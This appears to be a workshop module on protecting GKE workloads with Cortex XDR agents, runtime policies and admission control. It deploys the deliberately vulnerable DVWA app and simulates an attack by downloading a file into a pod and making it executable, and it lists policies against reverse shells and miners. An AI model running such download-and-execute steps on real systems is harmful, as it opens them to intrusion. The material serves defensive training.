# Module 6 — Protect GKE Workloads

## Overview

In this module you deploy Cortex Cloud runtime protection to your Google Kubernetes Engine (GKE) cluster.

## Steps

### 6.1 — Configure kubectl

```bash
gcloud container clusters get-credentials cortex-lab-gke --zone <zone>
kubectl get nodes
```

### 6.2 — Deploy Cortex XDR Agent DaemonSet

```bash
helm repo add cortex-cloud https://demisto.github.io/cortex-helm
helm repo update

helm install cortex-xdr cortex-cloud/cortex-xdr-agent \
  --namespace cortex-system \
  --create-namespace \
  --set cluster.name=cortex-lab-gke \
  --set secret.apiKey=<your-api-key> \
  --set secret.apiKeyId=<your-api-key-id>
```

### 6.3 — Verify Deployment

```bash
kubectl get pods -n cortex-system
kubectl get daemonset -n cortex-system
```

### 6.4 — Deploy Sample Application

```bash
kubectl apply -f templates/dvwa-deployment.yaml
kubectl get pods -n dvwa
```

### 6.5 — Configure Runtime Policies

1. Navigate to **Cloud Runtime Security → Policies → Runtime**.
2. Create runtime policies for the GKE cluster:
   * Block crypto miners and reverse shells
   * Detect anomalous network connections
   * Monitor file system changes in containers

### 6.6 — Test Runtime Detection

```bash
kubectl exec -it <dvwa-pod-name> -n dvwa -- /bin/bash
# Simulate suspicious activity
curl -o /tmp/test http://example.com/test
chmod +x /tmp/test
```

Review alerts in **Incidents & Alerts**.

### 6.7 — Admission Control

1. Deploy the admission controller:

```bash
helm install cortex-admission cortex-cloud/cortex-admission-controller \
  --namespace cortex-system \
  --set apiKey=<your-api-key>
```

2. Configure policies to block:
   * Privileged containers
   * Images from untrusted registries
   * Containers running as root

## Key Concepts

| Concept | Description |
|---|---|
| **GKE DaemonSet** | Cortex XDR agent on every node in the GKE cluster |
| **Runtime Policies** | Process, network and filesystem monitoring rules |
| **Admission Control** | Policy enforcement at deployment time |

## Next Steps

Congratulations! You have completed the GCP Cloud Protection workshop.

Return to the [Workshop Home](../README.md) to explore other cloud provider workshops.
